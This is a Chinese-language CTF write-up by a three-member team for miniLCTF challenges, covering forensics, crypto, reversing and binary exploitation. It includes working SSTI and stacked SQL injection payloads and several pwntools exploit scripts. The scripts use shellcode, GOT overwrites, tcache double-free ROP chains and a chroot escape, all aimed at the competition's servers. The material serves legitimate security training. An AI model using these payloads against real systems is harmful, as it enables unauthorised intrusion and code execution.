---

team: konossyyda
members:
    - shallow
    - Lunatic
    - Ga1@xy

---

## SIGN IN

 ### Starting Point | Author：Ga1@xy

进入链接网址，F12，得到flag，或者直接在网站首页最下面也能看到

![image-20200509185639654](https://i.loli.net/2020/05/09/Bgsf12AaRxSqUme.png)

## MISC

### MiniGameHacking | Author：Ga1@xy

下载附件，依次strings查看每个文件，在**data.unity3d**这个文件最后得到flag

![image-20200509184144606](https://i.loli.net/2020/05/09/2JQHR1f4ndv7ysM.png)

### EasyVmem | Author：Ga1@xy

下载附件得到一个vmem文件，我先用了AXIOM打开进行内存取证（软件看[这里](https://www.ssdax.com/3584.html)），在剪切板的数据里可以看到**MiniLCTF**的字样（不过是个假的flag），下面跟随了很多`s3cR3t`开头的类似坐标的数据

![image-20200512172758642](https://i.loli.net/2020/05/12/4enghJx8WG2EBdR.png)

但是数据量太过庞大，直接用这个软件并没有办法提取，所以又采用了**volatility**提取剪切板的数据

```
volatility -f challenge.vmem --profile=Win7SP1x64 clipboard -v > out.txt
```

将剪切板的数据导入**out.txt**这个文件，由于我们只要坐标相关的数据，再写脚本筛选一下

```python
import binascii

out = ''
f = open('out.txt','r')
fi = open('res.txt','w')
while 1:
	a = f.readline()
	if a:
		b = a.split('  ')[1].replace('00', '').replace(' ', '')
		b = binascii.unhexlify(b)
		out += b
	else:
		break

fi.write(out)
fi.close()
```

将得到的**res.txt**删去开头和结尾多余的部分，PIL库画图

```python
from PIL import Image

img = Image.new('RGB', (400, 400), (0, 0, 0))
f = open('res.txt','r')
while 1:
	a = f.readline()
	if a:
		x, y = a[7:].split(' ')
		x = int(x)
		y = int(y)
		img.putpixel((x, y), (255, 255, 255))
	else:
		break

img.save('flag.png')
```

得到一个二维码，扫码得到flag：`miniLCTF{mAst3R_0F_v0Lat1l1tY!}`

![image-20200512172424027](https://i.loli.net/2020/05/12/2drUiZlpCwg1LQn.png)

### MITM_0 | Author：Ga1@xy

第一反应就是用ip去试，第二个ip就对了：192.168.1.152

### MITM_1 | Author：Ga1@xy

翻了一遍流量包里的certificate，一共就五种CA，查了相关的资料，然后连蒙再猜（最开始base64还有点问题），也相当于是试出来了：Liuyukun CA

## WEB

### Personal_IP_Query | Author：Ga1@xy

本题考点为[ssti注入](https://xz.aliyun.com/t/3679#toc-1)，而且过滤了双下划线`__`，百度过滤后的注入方法，先构造get请求

```
?c=__class__&b=__bases__&s=__subclasses__&i=__init__&g=__globals__&bt=__builtins__&d=__import__('os').popen('cat /flag').read()
```

再伪造ip利用ssti漏洞进行注入

```
X-Forwarded-For: {{[][request.args.c][request.args.b][0][request.args.s]()[76][request.args.i][request.args.g][request.args.bt].eval(request.args.d)}}
```

得到flag

![image-20200509183253437](https://i.loli.net/2020/05/09/gUiK4hRSFNz1QXk.png)

### id_wife | Author：Ga1@xy

本题参考[BUUCTF-Web-随便注](https://www.jianshu.com/p/36f0772f5ce8)，稍微改一下参数即可

先弄出表名

```
w1nd');show tables;#
```

直接爆出数据库得到flag

```
w1nd');SET @sql=concat(char(115,101,108,101,99,116),'* from `1145141919810`');PREPARE jwt from @sql;EXECUTE jwt;#
```

![image-20200510122051057](https://i.loli.net/2020/05/10/HbfOsj16yntKoSD.png)

## ANDROID

### TestOnly? | Author：Ga1@xy，shallow

拿到apk文件，先用**dex2jar**反编译为jar文件，参考方法[百度经验](https://jingyan.baidu.com/article/d169e186031987436711d86e.html)

再用**jd-gui**反编译得到的jar文件，在最下面的**com.happy.testonly**找到main函数，可以看到这个函数最后得到了flag，接下来分析一下这个函数（个人理解）：

+ 有两个面对不同对象的a函数，一个b函数，一个I函数（没啥用），一个J函数（得到flag）
+ 第一个a函数面向字符（char类），第二个a函数面向字符串（String类）
+ b函数面向字符串，将字符串SHA1后`hexdigest()`
+ J函数创建了一个数组，与**localObject**进行按位异或操作得到flag

大体分析完代码含义，用python实现，即可得到flag

```python
from hashlib import sha1

flag = ''
loc = b'B08020D0FACFDAF81DB46890E4040EDBB8613DA5ABF038F8B86BD44525D2E27B26E22ACD06388112D8467FD688C79CC7EA83F27440577350E8168C2560368616'
loc = sha1(loc).hexdigest().encode()
arr = [85,95,5,83,75,96,94,0,17,61,102,87,80,123,4,105,85,83,101,109,55,85,23,48,106,1,40,7,97,31]
for i in range(len(arr)):
    flag += chr(arr[i] ^ loc[i])

print(flag.replace('flag','minil'))
```

## CRYPTO

### ιIl | Author：shallow

原题，soreat_u师傅在先知社区写过一篇十分详细的wp：https://xz.aliyun.com/t/7163

~~要不是比赛当天早上刚好跟别的师傅讨论这道题，还真写不出来~~

关键步骤是利用f与g，将r消去。而这里的f与g其实是同时满足
$$
fh \equiv g (mod \ p)
$$

$$
rg + mf < p
$$

的两个数。

因此按照那篇wp来构造格子，找到格子的cvp，即是(f , g)

（其实也并不需要cvp，LLL出来的矩阵第二个行向量同样满足条件。因此不会LLL算法，也可以有其他方法得到解向量，比如利用类似于wiener's attack的思路，利用$\frac{h}{p} - \frac{k}{f} = \frac{g}{fp}$而等式右边很小，从而求出f与g。

exp抄的soreat_u师傅的，不过需要稍微修改一下，因为cvp在四个象限都有一个，因此要对f与g加绝对值。

### f**k&base | Author：Ga1@xy , shallow

**source.txt**给了brainf**k编码后的内容，在线网站解码得到源程序

```python
from Crypto.Util.number import *
q=getPrime(1024)
f=getPrime(511)
g=getPrime(511)
while g<pow(q/4,0.5) and g>pow(q/2,0.5):
	g=getPrime(511)
f_inv_q=inverse(f,q)
h=f_inv_q*g%q
m=bytes_to_long(b'flag')#flag is base**(flag)
r=getPrime(510)
e=(r*h+m)%q
print f
print g
print q
print e
```

cry2的简化版，给了g和f，但我懒，直接算出h拿上面的exp打完了（逃

## REVERSE

### easyre | Author：shallow

稍微查了一下 _mm_store_si128函数，就是将内存中的128位复制过来，下面函数是将每个变量加100,转成字符串便是flag了。因此脚本如下

~~~python
def padding(s):
    if len(s) % 8 != 0:
        return '0' * (8 - (len(s) % 8)) + s
    else:
        return s
def change(s):
    res = ''
    s = padding(s)
    for i in range(len(s) // 8):
        tmp = int(s[i*8:i*8+8] , 16)
        if tmp > 0xFF:
            tmp = tmp - 0xFFFFFFFF - 1
        res = chr(100 + tmp) + res
    return res
flag = ''
flag += change('000000050000000A0000000500000009')
flag += change('FFFFFFFD000000010000001700000008')
flag += change('10000000E000000150000000F')
flag += change('1FFFFFFFB0000000FFFFFFFC3')
flag += change('19000000150000000FFFFFFFFD')
print(flag)
~~~

### What's Virtialization | Author：shallow

~~我怀疑这题有点小问题~~

首先是0x4010e0位置的函数，实现了一个~a2 & ~a1。

我们可以通过这个函数分析出，401090处的函数是非，401180处的函数是异或，401030处的函数是与

可以看到，三个for循环中，都是将输入与一个数组进行异或，然后进行相同的一个判断，如果判断通过了，则v14为0,在main函数的最后将通不过那个if，不是正确flag。因此必须让for循环里的判断不通过：即flag[i] & x == flag[i]

这并不能说明flag[i] = x，至少全为0肯定是能通过的。。但最方便的就是这个结果，于是将x与前面数组异或，恰好就得到了flag。

脚本如下:

```python
XOR = lambda s1 , s2:bytes([x1 ^x2 for x1 ,x2 in zip(s1 , s2)])
array1 = [1,1,2,3,5,8,13,21,34]
s1 = b'\x7d[^]|{'
s2 = b'\x64tKcXxDmYgoNY'
s3 = b'\x40D]pTYHp@Yw^O'
x = [0x30,0x32,0x30,0x34,0x30,0x38]
print(XOR(6 *x,s1+ s2 + s3))
```

很大蒙的成分。。。但出题人是不是就是这个意思啊（逃

## PWN

### hello | Author：Lunatic, shallow 

程序从 main 函数进入 vul 函数

![image-20200518114423513](https://i.loli.net/2020/05/18/KWCebnm61udYF9z.png)

显然在 fgets 函数处存在栈溢出，但可溢出的长度非常短，于是考虑到进行栈迁移

#### 利用脚本如下：

```python
# pwn.challenge.mini.lctf.online 10091

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

if args.G:
    io = remote('pwn.challenge.mini.lctf.online', 10091)
else:
    io = process('./hello')

offset = 0x30
bss = 0x601060

payload  = '\x90' * offset + p64(bss + 500) + p64(0x4006FA)

# gdb.attach(io)

io.recvuntil('What\'s your name?')
io.sendline(payload)

payload  = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload += '\x90' * 21 + p64(bss + 500) + p64(bss + 500 - offset)

sleep(0.5)
io.sendline(payload)

io.interactive()
```

这种做法没有用到 bd 函数

### ezsc | Author：Lunatic

容易看出这是一道 alphanumeric shellcode 类型的题目，取一条合适的 shellcode 一把梭即可

```python
WTYH39Yj0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZjJTYfi92ERARZ0T8AZ0T8CRAPZ0T8DZ0T8ERAQZ0T8FZ0T8GRAPZ0T8HZ0T8IRAQZ0T8JZ0T8KRAPZ0T8MZRARZ0T8NZRAPZ0t8QZ0T8RRAPZ0t8VZ0T8W0t8X0t8Y0t8Z1HHsQUVYPDW7HwSSToQRWTnxnZP
```

### noleak | Author：Lunatic

一道存在后门函数的堆题，于是可以想到覆盖 free@got 为后门函数地址，再调用 free 函数 get shell

#### 利用脚本如下：

```python
# pwn.challenge.mini.lctf.online 10011

from pwn import *

context.log_level = 'debug'

if args.G:
    io = remote('pwn.challenge.mini.lctf.online', 10011)
else:
    io = process('./time_management')

def add(size, content):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('How many minutes will it take you to finish?')
    io.sendline(str(size))
    io.recvuntil('Content of the plan:')
    io.sendline(content)

def edit(ticket, size, content):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(ticket))
    io.recvuntil('How many minutes will it take you to finish?')
    io.sendline(str(size))
    io.recvuntil('Content of the plan:')
    io.sendline(content)

def dele(ticket):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(ticket))

prt_arr = 0x6020c0
get_shell = 0x400C9F

# gdb.attach(io)

add(0x60, 'AAAA') # 0
add(0x60, 'BBBB') # 1
add(0x60, 'CCCC') # 2
dele(1)
edit(0, 0, 'D' * (0x60 + 0x8) + p64(0x71) + p64(prt_arr - 11 - 8))
add(0x60, 'EEEE') # 1
add(0x60, 'FFFF') # 3 prt_arr
edit(3, 0, 'G' * 3 + p64(0x602018) * 4)
edit(0, 0, p64(get_shell))
dele(0)

# gdb.attach(io)

io.interactive()
```

### easycpp | Author：Lunatic

```python
# nc pwn.challenge.mini.lctf.online 10008

from pwn import *

context.log_level = 'debug'

if args.G:
    io = remote('pwn.challenge.mini.lctf.online', 10008)
else:
    io = process('./easycpp')

backdoor = 0x80487BB
buf = 0x804A0C0

payload = p32(buf + 4) + p32(backdoor)

# gdb.attach(io)

io.sendline(payload)

io.interactive()
```

### heap_master | Author：Lunatic

nc 后进行 double free 操作，发现程序没有 crash，说明服务器上使用的 libc 版本应该为 2.27（根据 sad 的 hint）。接下来的流程便是泄露 libc 地址，通过 environ 泄露栈地址，将 payload 写入栈中，orw 读取 flag（prctl 函数限制）。

#### 利用脚本如下：

```python
# pwn.challenge.mini.lctf.online 10008

from pwn import *

context.log_level = 'debug'

if args.G:
    io = remote('pwn.challenge.mini.lctf.online', 10008)
else:
    io = process('./pwn')

def add(size, content):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('size?')
    io.sendline(str(size))
    io.recvuntil('content?')
    io.send(content)

def dele(ticket):
    io.recvuntil('>> ')
    io.sendline('2')
    io.recvuntil('index ?')
    io.sendline(str(ticket))

def show(ticket):
    io.recvuntil('>> ')
    io.sendline('3')
    io.recvuntil('index ?')
    io.sendline(str(ticket))

elf = ELF('./pwn')
libc = ELF('/mnt/hgfs/CTF/BUUCTF/libc/Ubuntu_18_64/libc-2.27.so')

note = 0x6020c0

# gdb.attach(io)

io.recvuntil('what is your name? ')
io.sendline('sadsadsadsadsadsadsadsadsadsadsadsadsadsadsadsadsadsadsad')

add(0x90, '0000') # 0
add(0x90, '1111') # 1
add(0x90, '2222') # 2
add(0x90, '3333') # 3
add(0x90, '4444') # 4
add(0x90, '5555') # 5
add(0x90, '6666') # 6
add(0x90, '7777') # 7
add(0x60, '8888') # 8
add(0xb0, '9999') # 9

dele(0)
dele(1)
dele(2)
dele(3)
dele(4)
dele(5)
dele(6)

dele(7)

show(7)

unsorted_bins = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
main_area = unsorted_bins - 0x60
libc_base = main_area - 0x3ebc40
environ = libc_base + 0x3ee098

dele(8)
dele(8)

add(0x60, p64(note)) # 10 8
add(0x60, 'bbbb') # 11 8
add(0x60, p64(environ)) # 12 note

show(0)

leaked_stack = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
ret = leaked_stack - 0x220

free_hook = libc_base + libc.sym['__free_hook']

read_addr = elf.plt['read']
puts_addr = elf.plt['puts']
open_addr = libc_base + libc.sym['open']

pop_rdi_ret = libc_base + libc.search(asm("pop rdi\nret")).next()
pop_rsi_ret = libc_base + libc.search(asm("pop rsi\nret")).next()
pop_rdx_ret = libc_base + libc.search(asm("pop rdx\nret")).next()

payload  = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(free_hook) + p64(pop_rdx_ret) + p64(4) + p64(read_addr)
payload += p64(pop_rdi_ret) + p64(free_hook) + p64(pop_rsi_ret) + p64(4) + p64(open_addr)
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(free_hook) + p64(pop_rdx_ret) + p64(0x30) + p64(read_addr)
payload += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)

dele(9)
dele(9)

add(0xb0, p64(ret)) # 13 9
add(0xb0, 'bbbb') # 14 9
add(0xb0, payload) # 15 ret

io.send('flag')

# gdb.attach(io)

io.interactive()
```

### jail | Author：Lunatic

本题需要发送 elf 文件进行 chroot 沙箱逃逸。因为在 init 函数中创建了根目录的文件描述符且该文件描述符未被关闭，故可利用其进行逃逸，读取根目录下的 flag。

#### 利用脚本如下：

```python
# pwn.challenge.mini.lctf.online 10092

from pwn import *

if args.G:
    io = remote('pwn.challenge.mini.lctf.online', 10092)
else:
    io = process('./chroot')

f = open('./c2', 'rb')
data = f.read()
length = len(data)

'''
/* c2.c */

#include <fcntl.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

int main() {
	int fd;
	int ret1;
	char buf[100] = {};

	fd = openat(4, "flag", 0);
	// ret1 = fchdir(4);
	read(fd, buf, 100);
	write(1, buf, 100);
'''

io.recvuntil('elf len?')
io.sendline(str(length))

io.recvuntil('data?')
io.send(data)

# gdb.attach(io)

context.log_level = 'debug'

io.recvuntil('what arg do you wanna pass to your elf?')
io.sendline('')

io.interactive()
```

